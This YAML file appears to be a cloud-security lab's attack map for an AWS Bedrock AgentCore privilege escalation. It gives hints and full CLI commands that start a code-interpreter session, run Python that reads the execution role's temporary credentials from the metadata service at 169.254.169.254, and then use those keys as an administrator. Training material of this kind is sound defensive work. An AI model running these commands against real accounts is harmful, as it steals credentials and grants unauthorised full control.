attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-bedrock-002-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has bedrock-agentcore:StartCodeInterpreterSession and
        bedrock-agentcore:InvokeCodeInterpreter permissions on the pre-deployed target
        code interpreter. No iam:PassRole permission is required because the privileged
        role is already attached to the existing interpreter.

    - id: code-interpreter
      label: "Code Interpreter"
      type: resource
      subType: bedrock-agent
      arn: "arn:aws:bedrock-agentcore:{region}:{account_id}:code-interpreter/pl-prod-bedrock-002-to-admin-target-interpreter"
      description: >
        This is a pre-deployed Bedrock AgentCore code interpreter with an admin
        execution role already attached. It runs on a Firecracker MicroVM that exposes
        a metadata service at 169.254.169.254, similar to EC2 IMDS but without the
        IMDSv2 token requirement. Python code executed in this interpreter can read
        temporary credentials from the metadata endpoint.

    - id: target-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-bedrock-002-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess and is pre-attached as the execution role
        for the code interpreter. By extracting its temporary credentials from the
        MicroVM Metadata Service, you gain full administrative access to the AWS account.

  edges:
    - from: starting-principal
      to: code-interpreter
      label: "bedrock-agentcore:StartCodeInterpreterSession"
      description: >
        Start a session on the existing code interpreter. Because the role is already
        attached to the interpreter, no iam:PassRole permission is required.
      hints:
        - "You can interact with existing Bedrock code interpreters."
        - "Look for code interpreters that already have privileged roles attached."
        - "Browse to https://pathfinding.cloud/paths/bedrock-002 for technique details."
      commands:
        - description: "Start a session on the existing code interpreter"
          command: "aws bedrock-agentcore start-code-interpreter-session --code-interpreter-id pl-prod-bedrock-002-to-admin-target-interpreter"

    - from: code-interpreter
      to: target-role
      label: "bedrock-agentcore:InvokeCodeInterpreter + MMDS"
      description: >
        Execute Python code within the interpreter session to access the MicroVM
        Metadata Service and extract the execution role's temporary credentials.
      hints:
        - "The interpreter runs on a MicroVM with a metadata service."
        - "Try accessing 169.254.169.254 from within the interpreter."
        - "The path /latest/meta-data/iam/security-credentials/execution_role returns credentials."
      commands:
        - description: "Invoke the interpreter to extract credentials from MMDS"
          command: "aws bedrock-agentcore invoke-code-interpreter --code-interpreter-id pl-prod-bedrock-002-to-admin-target-interpreter --session-id <SESSION_ID> --code 'import urllib.request; print(urllib.request.urlopen(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role\").read().decode())'"
        - description: "Verify admin access with extracted credentials"
          command: "AWS_ACCESS_KEY_ID=<extracted> AWS_SECRET_ACCESS_KEY=<extracted> AWS_SESSION_TOKEN=<extracted> aws iam list-users"
